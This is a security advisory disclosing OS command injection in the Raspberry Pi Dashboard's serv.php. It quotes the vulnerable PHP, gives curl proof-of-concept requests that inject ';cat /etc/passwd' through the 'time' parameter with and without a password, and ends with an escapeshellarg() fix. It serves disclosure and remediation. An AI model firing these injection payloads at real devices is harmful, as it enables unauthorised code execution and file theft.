# CVE-XXXX-XXXXX — OS Command Injection / RCE in Raspberry Pi Dashboard

| Field            | Value                                                                                   |
|------------------|-----------------------------------------------------------------------------------------|
| Product          | [Raspberry Pi Dashboard](https://github.com/femto-code/Raspberry-Pi-Dashboard)         |
| Version          | v0.1 – v1.1.6 (all releases)                                                            |
| File             | `backend/serv.php` (lines 76–93)                                                        |
| CVE              | CVE-XXXX-XXXXX (pending)                                                                |
| CWE              | CWE-78 — Improper Neutralization of Special Elements used in an OS Command              |
| CVSS 3.1 Vector  | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                                                    |
| CVSS Score       | 9.8 (Critical)                                                                          |
| Auth Required    | No (default state) / Yes (if password configured)                                       |
| Discovered by    | Lennart Hostettler                                                                      |
| Date             | 12/06/2026                                                                              |

## Description

The main request handler in `backend/serv.php` (lines 76–98) passes the user-supplied `time`
parameter directly into a `system()` call without sanitization, allowing arbitrary OS command
injection.

```php
// backend/serv.php, lines 76–93
if(isset($_REQUEST["p"])){
  $pass = md5($_REQUEST["p"]);
  $time = $_REQUEST["time"];          // [1] unsanitized user input
  if (strpos($time, ':') == false) {
    $time = "+" . $time;              // [2] only prepends "+", no sanitization
  }
  // ...
  system('sudo /sbin/shutdown -h ' . $time);  // [3] injection point
  system("sudo /sbin/shutdown -r "  . $time); // [3] injection point
  echo json_encode(getShutdownEventsInfo());  // [4] called post-injection
}
```

The only transformation applied to `$time` is a conditional `+` prefix. Shell metacharacters such
as `;`, `&&`, `|`, `$()`, and backticks are never filtered, allowing injection regardless of the
prefix logic.

## Proof of Concept

**Step 1 — Unauthenticated (default state, no password set)**

If no password has been configured during setup, the vulnerability is fully unauthenticated:

```bash
curl -s "http://<host>/backend/serv.php?a=2&time=lennart1337;cat+/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Step 2 — Authenticated (custom password configured)**

```bash
curl -v "http://<host>/backend/serv.php?p=<password>&a=2&time=lennart1337;cat+/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Vulnerability History

The injection has been present since the first commit (`45094ce`, v0.1, 2020-06-16) and remains
unpatched through v1.1.6. In the original version the password was hardcoded as plaintext `"root"`
directly in the source code, making exploitation trivially unauthenticated:

```php
// v0.1 — backend/serv.php
$pass = $_REQUEST["p"];
if($pass != "root"){
    echo "wrongCredentials";
}else{
    system("sudo /sbin/shutdown -r +" . $time); // no sanitization
}
```

## Impact

An attacker achieves Remote Code Execution as `www-data`. On a typical Raspberry Pi deployment this allows:

- Reading local files (config files, SSH keys, etc.)
- Establishing a reverse shell
- Lateral movement within the local network

## Remediation

Sanitize `$time` using `escapeshellarg()` before passing it to `system()`:

```php
system('sudo /sbin/shutdown -h ' . escapeshellarg($time));
system("sudo /sbin/shutdown -r "  . escapeshellarg($time));
```
